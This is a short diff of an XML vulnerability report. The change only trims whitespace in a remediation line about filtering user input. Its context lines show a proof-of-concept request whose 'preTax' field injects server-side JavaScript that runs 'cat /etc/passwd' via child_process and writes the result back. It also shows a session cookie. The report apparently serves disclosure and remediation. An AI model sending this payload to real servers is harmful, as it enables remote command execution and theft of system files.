@@ -26,7 +26,7 @@ Cookie: connect.sid=s%3ATVNY7sIvAefK3mQqKY55ouSIymVtOlNr.ab4Ev%2FCyiDZODrQZOQL1E
 Upgrade-Insecure-Requests: 1
 
 preTax=preTax%3D2%3B+var+asd+%3D+require%28%27child_process%27%29.execSync%28%27cat+%2Fetc%2Fpasswd%27%29%3B+res.write%28asd%29&roth=0&afterTax=0]]></PoC>
-		<Remediation><![CDATA[Develop, test and deploy corrections for the application’s source code to properly filter all user-supplied input processed by the application. 
+		<Remediation><![CDATA[Develop, test and deploy corrections for the application’s source code to properly filter all user-supplied input processed by the application.
 ]]></Remediation>
 	</Vulnerability>
 </Vulnerabilities>
